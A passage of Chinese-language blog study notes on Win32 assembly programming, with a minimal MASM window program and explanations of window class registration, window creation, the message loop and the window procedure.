class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br></pre></td><td class="code"><pre><span class="line">.386 </span><br><span class="line">.model flat,stdcall </span><br><span class="line">option casemap:none </span><br><span class="line">;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt; </span><br><span class="line">; Include 文件定义</span><br><span class="line">;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt; </span><br><span class="line">include windows.inc </span><br><span class="line">include gdi32.inc </span><br><span class="line">includelib gdi32.lib </span><br><span class="line">include user32.inc </span><br><span class="line">includelib user32.lib </span><br><span class="line">include kernel32.inc </span><br><span class="line">includelib kernel32.lib </span><br><span class="line">;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt; </span><br><span class="line">; 数据段</span><br><span class="line">;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt; </span><br><span class="line">.data? </span><br><span class="line"></span><br><span class="line">hInstance dd ? </span><br><span class="line">hWinMain dd ? </span><br><span class="line"></span><br><span class="line">.const </span><br><span class="line"></span><br><span class="line">szClassName db &#x27;MyClass&#x27;,0 </span><br><span class="line">szCaptionMain db &#x27;My first Window !&#x27;,0 </span><br><span class="line">szText db &#x27;Win32 Assembly, Simple and powerful !&#x27;,0 </span><br><span class="line">;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt; </span><br><span class="line">; 代码段</span><br><span class="line">;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt; </span><br><span class="line">.code </span><br><span class="line">;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt; </span><br><span class="line">; 窗口过程</span><br><span class="line">;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt; </span><br><span class="line">_ProcWinMain proc uses ebx edi esi,hWnd,uMsg,wParam,lParam </span><br><span class="line">local @stPs:PAINTSTRUCT </span><br><span class="line">local @stRect:RECT </span><br><span class="line">local @hDc </span><br><span class="line"></span><br><span class="line">mov eax,uMsg </span><br><span class="line">;******************************************************************** </span><br><span class="line">.if eax == WM_PAINT </span><br><span class="line">invoke BeginPaint,hWnd,addr @stPs </span><br><span class="line">mov @hDc,eax</span><br><span class="line"></span><br><span class="line">invoke GetClientRect,hWnd,addr @stRect </span><br><span class="line">invoke DrawText,@hDc,addr szText,-1,\ </span><br><span class="line">addr @stRect,\ </span><br><span class="line">DT_SINGLELINE or DT_CENTER or DT_VCENTER </span><br><span class="line">invoke EndPaint,hWnd,addr @stPs </span><br><span class="line">;******************************************************************** </span><br><span class="line">.elseif eax == WM_CLOSE </span><br><span class="line">invoke DestroyWindow,hWinMain </span><br><span class="line">invoke PostQuitMessage,NULL </span><br><span class="line">;******************************************************************** </span><br><span class="line">.else </span><br><span class="line">invoke DefWindowProc,hWnd,uMsg,wParam,lParam </span><br><span class="line">ret </span><br><span class="line">.endif </span><br><span class="line">;******************************************************************** </span><br><span class="line">xor eax,eax </span><br><span class="line">ret </span><br><span class="line"></span><br><span class="line">_ProcWinMain endp </span><br><span class="line">;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt; </span><br><span class="line">_WinMain proc </span><br><span class="line">local @stWndClass:WNDCLASSEX </span><br><span class="line">local @stMsg:MSG </span><br><span class="line"></span><br><span class="line">invoke GetModuleHandle,NULL </span><br><span class="line">mov hInstance,eax </span><br><span class="line">invoke RtlZeroMemory,addr @stWndClass,sizeof @stWndClass </span><br><span class="line">;******************************************************************** </span><br><span class="line">; 注册窗口类</span><br><span class="line">;******************************************************************* </span><br><span class="line"> invoke LoadCursor,0,IDC_ARROW </span><br><span class="line"> mov @stWndClass.hCursor,eax </span><br><span class="line"> pushhInstance </span><br><span class="line"> pop @stWndClass.hInstance </span><br><span class="line"> mov @stWndClass.cbSize,sizeof WNDCLASSEX </span><br><span class="line"> mov@stWndClass.style,CS_HREDRAW or CS_VREDRAW </span><br><span class="line"> mov @stWndClass.lpfnWndProc,offset _ProcWinMain </span><br><span class="line"> mov @stWndClass.hbrBackground,COLOR_WINDOW + 1 </span><br><span class="line"> mov @stWndClass.lpszClassName,offset szClassName </span><br><span class="line"> invoke RegisterClassEx,addr @stWndClass </span><br><span class="line">;******************************************************************** </span><br><span class="line">; 建立并显示窗口</span><br><span class="line">;******************************************************************** </span><br><span class="line"> invoke CreateWindowEx,WS_EX_CLIENTEDGE,\ </span><br><span class="line"> offsetszClassName,offset szCaptionMain,\ </span><br><span class="line">WS_OVERLAPPEDWINDOW,\ </span><br><span class="line">100,100,600,400,\ </span><br><span class="line">NULL,NULL,hInstance,NULL </span><br><span class="line"> mov hWinMain,eax </span><br><span class="line"> invoke ShowWindow,hWinMain,SW_SHOWNORMAL </span><br><span class="line"> invoke UpdateWindow,hWinMain </span><br><span class="line">;******************************************************************** </span><br><span class="line">; 消息循环</span><br><span class="line">;******************************************************************** </span><br><span class="line"> .while TRUE </span><br><span class="line"> invoke GetMessage,addr @stMsg,NULL,0,0 </span><br><span class="line"> .break .if eax == 0 </span><br><span class="line"> invoke TranslateMessage,addr @stMsg </span><br><span class="line"> invoke DispatchMessage,addr @stMsg </span><br><span class="line"> .endw </span><br><span class="line"> ret </span><br><span class="line">_WinMain endp </span><br><span class="line">;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt; </span><br><span class="line">start: </span><br><span class="line"> call _WinMain </span><br><span class="line"> invoke ExitProcess,NULL </span><br><span class="line">;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;</span><br><span class="line"></span><br><span class="line">endstart</span><br><span class="line"></span><br></pre></td></tr></table></figure><ul><li>在windows下的编程，基本都是调用API函数</li></ul><h3 id="3-框架分析"><a href="#3-框架分析" class="headerlink" title="3.)框架分析"></a>3.)框架分析</h3><ul><li>读代码首先要找入口</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">start -&gt; _WinMain -&gt; Exitprocess</span><br></pre></td></tr></table></figure><ul><li>从调用的API函数入手</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GetModuleHandle--&gt;RtlZeroMemory--&gt;LoadCursor--&gt;RegisterClassEx--&gt;CreateWindowEx--&gt;ShowWindow--&gt;UpdateWindow</span><br></pre></td></tr></table></figure><ul><li>然后是三个API函数的循环</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">.while TRUE </span><br><span class="line">invoke GetMessage,addr @stMsg,NULL,0,0 </span><br><span class="line">.break .if eax == 0 </span><br><span class="line">invoke TranslateMessage,addr @stMsg </span><br><span class="line">invoke DispatchMessage,addr @stMsg </span><br><span class="line">.endw</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GetMessage --&gt;TranslateMessage --&gt;DispatchMessage</span><br></pre></td></tr></table></figure><p><img src="https://cdn.staticaly.com/gh/re-again/pic_bed@main/md/image-20230423230508501.png" alt="image-20230423230508501"></p><ul><li><p> 回调函数，就是windows自己调用的函数，不是我们自己调用的</p></li><li><p>  windows在系统内部有一个系统消息队列，当输入设备有所动作的时候，windows都会记录在队列里面</p></li></ul><h3 id="4-）PostMessage和SendMessage"><a href="#4-）PostMessage和SendMessage" class="headerlink" title="4.）PostMessage和SendMessage"></a>4.）PostMessage和SendMessage</h3><ul><li>PostMessage是吧消息放到其他程序的消息队列中</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">如：图中的d箭头，目标程序收到了这条消息就把他放入该程序的消息队列处理</span><br></pre></td></tr></table></figure><ul><li>SendMessage则越过直接调用目标程序的窗口</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">如：途中的箭头I，窗口过程返回以后才从SendMessage返回，如箭头II</span><br></pre></td></tr></table></figure><h1 id="分析窗口程序"><a href="#分析窗口程序" class="headerlink" title="分析窗口程序"></a>分析窗口程序</h1><ul><li>下边将详细分析窗口程序咯</li><li>调用API函数，来实现功能。</li></ul><h2 id="1-模块和句柄"><a href="#1-模块和句柄" class="headerlink" title="1.模块和句柄"></a>1.模块和句柄</h2><h3 id="1-）句柄是什么"><a href="#1-）句柄是什么" class="headerlink" title="1.）句柄是什么"></a>1.）句柄是什么</h3><ul><li>句柄是windows用来表示各种资源的编号</li><li>windows中的东西都是用句柄来标识的，直接用就好了</li></ul><h3 id="2-）模块是什么"><a href="#2-）模块是什么" class="headerlink" title="2.）模块是什么"></a>2.）模块是什么</h3><ul><li>一个模块代表的是一个运行中的exe文件或dll文件，用来代表这个文件中所有的代码和资源，磁盘上的文件不是模块，装入内存后运行的时候叫模块</li><li>取模块句柄使用的API函数是    GetModuleHandle</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">invoke GetModuleHandle,lpModuleName</span><br></pre></td></tr></table></figure><ul><li><p>lpModuleName 参数是指向该模块名称 字符串的指针</p></li><li><p>比如想得到User32.dll的句柄</p></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">szUserDlldb&#x27;User32.dll&#x27;,0</span><br><span class="line">...</span><br><span class="line">invokeGetModuleHandle,addr szUserDll</span><br><span class="line">.ifeax</span><br><span class="line">movhUserDllHandle,eax</span><br><span class="line">.endif</span><br><span class="line">...</span><br></pre></td></tr></table></figure><ul><li>如果参数是NULL则GetModuleHandle，那么得到的是调用本模块的句柄</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">invokeGetModuleHandle,NULL</span><br><span class="line">movhInstance,eax</span><br></pre></td></tr></table></figure><ul><li>h的意思就是句柄</li></ul><h2 id="2-创建窗口"><a href="#2-创建窗口" class="headerlink" title="2.创建窗口"></a>2.创建窗口</h2><ul><li>类【不多说】</li><li>windows中创建窗口使用这样的层次结构</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1.定义一个床亏类</span><br></pre></td></tr></table></figure><h3 id="1-）注册窗口类"><a href="#1-）注册窗口类" class="headerlink" title="1.）注册窗口类"></a>1.）注册窗口类</h3><ul><li>注册窗口类的API函数是  RegisterClassEx </li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Ex是扩展的意思</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">local@stWndClass:WNDCLASSEX</span><br><span class="line">...[通过索引这个对象中的东西去修改]</span><br><span class="line">invokeRegisterClassEx,addr @stWndClass</span><br></pre></td></tr></table></figure><ul><li>这个函数里面会有很多属性，这些属性应该用多个参数送过去，但是太多了，所以就吧这些参数定义在一个类中WNDCLASSEX</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">WNDCLASSEX STRUCT</span><br><span class="line">  cbSize            DWORD      ?;结构的字节数</span><br><span class="line">  style             DWORD      ?;类风格</span><br><span class="line">  lpfnWndProc       DWORD      ?;窗口过程的地址</span><br><span class="line">  cbClsExtra        DWORD      ?</span><br><span class="line">  cbWndExtra        DWORD      ?</span><br><span class="line">  hInstance         DWORD      ?;所属的实例句柄</span><br><span class="line">  hIcon             DWORD      ?;窗口句柄</span><br><span class="line">  hCursor           DWORD      ?;窗口光标</span><br><span class="line">  hbrBackground     DWORD      ?;背景色</span><br><span class="line">  lpszMenuName      DWORD      ?;窗口菜单</span><br><span class="line">  lpszClassName     DWORD      ?;类名字符串的地址</span><br><span class="line">  hIconSm           DWORD      ?;小图标</span><br><span class="line">WNDCLASSEX ENDS</span><br></pre></td></tr></table></figure><ul><li><p>程序定义了一个WNDCLASSEX结构的变量@stWndClass，用RtlZeroMemory   API函数将他里面的内容全部填写0【这里是局部变量，所以需要置为0】，再填写结构的各个字段。</p></li><li><p>这里每一个参数都有自己的意义和用法，强烈建议查资料，或者看书P101-102</p></li><li><p>补充一个知识点，对于不同二进制位组合的计算。强烈建议使用or</p></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">当某个东西是靠着，二进制某些位上的0/1来判断是否使用的某功能的时候，如果好几张功能想同时使用，一般下是使用or【逻辑或】来进行。</span><br><span class="line">比如：P102下面的小灯泡。</span><br><span class="line"></span><br><span class="line">or ==&gt; 一真即真【不懂自己百度】</span><br><span class="line">and ==&gt; 一假即假</span><br></pre></td></tr></table></figure><h3 id="2-）建立窗口"><a href="#2-）建立窗口" class="headerlink" title="2.）建立窗口"></a>2.）建立窗口</h3><ul><li>在注册窗口类的时候，是把窗口很多“共性”都写在了一起。</li><li>建立窗口，就还需要去指定窗口的很多“个性化”的参数</li><li>建立窗口的API函数是：CreateWindowEx</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">invoke  CreateWindowEx,dwExStyle,lpClassName,lpWindowName,dwStyle,\          x,y,nWidth,nHeight,hWndParent,hMenu,hInstance,lpParam</span><br></pre></td></tr></table></figure><ul><li>它每一个参数都有自己的意义</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">请结合书P103-104</span><br></pre></td></tr></table></figure><ul><li>把窗口显示出来的API函数是：ShowWindow</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ShowWindow,句柄,显示方式</span><br><span class="line">第一个参数是句柄，第二个是显示方式P106</span><br></pre></td></tr></table></figure><h3 id="3-整一个按钮"><a href="#3-整一个按钮" class="headerlink" title="3.)整一个按钮"></a>3.)整一个按钮</h3><ul><li>这个去看windowpro文件</li></ul><h2 id="3-消息循环"><a href="#3-消息循环" class="headerlink" title="3.消息循环"></a>3.消息循环</h2><ul><li>windows是一个以消息驱动的操作系统</li><li>windows中有一个消息队列</li><li>应用程序中含有一段称为“消息循环”的代码，用来从消息队列中检索这些消息并把他们分发到相应的窗口函数中</li></ul><h3 id="1-）消息循环的一般形式"><a href="#1-）消息循环的一般形式" class="headerlink" title="1.）消息循环的一般形式"></a>1.）消息循环的一般形式</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">local @stMsg:MSG</span><br><span class="line"> </span><br><span class="line">.while TRUE </span><br><span class="line"> invoke GetMessage,addr @stMsg,NULL,0,0 </span><br><span class="line"> .break .if eax == 0 </span><br><span class="line"> invoke TranslateMessage,addr @stMsg </span><br><span class="line"> invoke DispatchMessage,addr @stMsg </span><br><span class="line"> .endw </span><br></pre></td></tr></table></figure><ul><li>消息循环中要用到一个MSG结构</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">MSGSTRUCT</span><br><span class="line">hwndDWORD?</span><br><span class="line">messageDWORD?</span><br><span class="line">wparamDWORD?</span><br><span class="line">lparamDWORD?</span><br><span class="line">timeDWORD?</span><br><span class="line">ptPOINT&lt;&gt;</span><br><span class="line">MSGENDS</span><br></pre></td></tr></table></figure><ul><li>其中的含义请看书P107</li><li>这个结构定义了消息的所有属性，GetMessage就是从消息队列中取出这样一条消息的</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">invokeGetMessage,lpMsg,hWnd,wMsgFilterMin,wMsgFilterMax</span><br></pre></td></tr></table></figure><ul><li><p>hWnd参数指定要获得哪个窗口的消息，例子中为NULL则就是本程序所属窗口的消息</p></li><li><p> TranslateMessage</p></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">TranslateMessage,addr @stMsg </span><br></pre></td></tr></table></figure><ul><li>DispatchMessage</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">DispatchMessage,addr @stMsg </span><br></pre></td></tr></table></figure><ul><li>作用请看P108【确实很烦，多看几遍】</li></ul><h3 id="2-）其他形式的消息循环"><a href="#2-）其他形式的消息循环" class="headerlink" title="2.）其他形式的消息循环"></a>2.）其他形式的消息循环</h3><ul><li>首先我们得知道的是：任务之间是20ms切换一次，在到某个任务的时候，不论在工作或者等待，都得等待20ms才会进入下一个任务</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">所以如果GetMessage中没有任何消息的话，就会等待20ms，从而浪费时间。【这个浪费时间其实是对CPU的内耗，因为CPU要一直从消息队列里面去获取消息，但是又获取不到消息，这样就会白白的消耗CPU】</span><br></pre></td></tr></table></figure><ul><li>GetMessage函数是程序空闲的时候主动将控制权 windows的一种方式，windows是一个抢占式的多任务系统…</li><li>这里如果啥都没有就会时间内耗，在while循环中等待，没任何意义，所以有更好的办法。<ul><li>用PeekMessage      api函数</li></ul></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">.whileTRUE</span><br><span class="line">invoke PeekMessage,addr @stMsg,NULL,0,0,PM_REMOVE</span><br><span class="line">        .ifeax</span><br><span class="line">        .break.if  @stMsg.message == WM_QUIT</span><br><span class="line">        invokeTranslateMessage,addr @stMsg </span><br><span class="line">        invokeDispatchMessage,addr @stMsg </span><br><span class="line">        .else</span><br><span class="line">        &lt;其他的工作&gt;</span><br><span class="line">        .endif</span><br><span class="line">.endw</span><br></pre></td></tr></table></figure><ul><li>PeekMessage是一个类似GetMessage的函数，区别在于当消息队列里面有消息的时候，PeekMessage取回消息，并在eax中返回非零值。</li><li>当消息队列里面没有消息的时候，就可以直接去运行其他工作，达到很好的使用。</li><li>PeekMessage前面的参数和GetMessage一样。</li><li>最后一个参数表示在取回消息后，对消息队列中的消息是否保留。这里使用PM_REMOVE就是不保留。</li></ul><h2 id="4-窗口过程"><a href="#4-窗口过程" class="headerlink" title="4.窗口过程"></a>4.窗口过程</h2><ul><li><p>首先窗口过程，是给windows回调用的。【也就是说它是一个函数】并且是一个自己创建的函数【这个函数的参数是定好的了的】</p></li><li><p>这个窗口过程，对于windows来说，地址来才是所需要的。</p></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">WindowProcprochwnd, uMsg, wParam, lParam</span><br></pre></td></tr></table></figure><ul><li><p>第一个参数是窗口句柄，由于一个窗口过程可能为多个基于同一个窗口类的窗口服务，所以windows回调的时候必须指定要操作的，要对这个对象进行运用都需要句柄</p></li><li><p>第二个参数是消息标志，后面俩个参数是消息的俩个参数</p></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">WindowProcprocuses ebx edi esi hWnd,uMsg,wParam,lParam</span><br><span class="line">moveax,uMsg</span><br><span class="line">.ifeax == WM_XXX</span><br><span class="line">&lt;处理WM_XXX消息&gt;</span><br><span class="line">.elseifeax == WM_YYY</span><br><span class="line">&lt;处理WM_YYY消息&gt;</span><br><span class="line">.elseifeax == WM_CLOSE</span><br><span class="line">invoke Desinvoke DestroyWindow,hWinMain </span><br><span class="line">invoke PostQuitMessage,NULL </span><br><span class="line">.else</span><br><span class="line">invokeDefWindowProc,hWnd,uMsg,wParam,lParam</span><br><span class="line">ret</span><br><span class="line">.endif</span><br><span class="line"></span><br><span class="line">xoreax,eax</span><br><span class="line">ret</span><br><span class="line">WindowProcendp</span><br></pre></td></tr></table></figure><ul><li><p>这个过程主要是对uMsg参数中的消息编号构成一个分支语句</p></li><li><p>但对于需要处理的消息分别处理。不感兴趣的消息都给DefWindowProc处理</p></li><li><p>ebx edi esi ebp 是指针寄存器，需要保存起来</p></li><li><p>ecx edx 就不需要咯 </p></li><li><p>又很多内容，请看P110</p></li></ul><h3 id="2-收到消息的顺序"><a href="#2-收到消息的顺序" class="headerlink" title="2.)收到消息的顺序"></a>2.)收到消息的顺序</h3><p>P111-112</p><h3 id="3-消息默认处理–DefWindowProc"><a href="#3-消息默认处理–DefWindowProc" class="headerlink" title="3.)消息默认处理–DefWindowProc"></a>3.)消息默认处理–DefWindowProc</h3><h1 id="窗口间的通信"><a href="#窗口间的通信" class="headerlink" title="窗口间的通信"></a>窗口间的通信</h1><h2 id="1-窗口间的消息互发"><a href="#1-窗口间的消息互发" class="headerlink" title="1.窗口间的消息互发"></a>1.窗口间的消息互发</h2><p>Emmmm 学了这么多，总感觉迷迷糊糊的。要不直接来学学二进制吧。哈哈啊哈</p>]]></content>
      
      
      <categories>
          
          <category> WIN32程序设计 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>WIN32程序设计-阅读必看（0)</title>
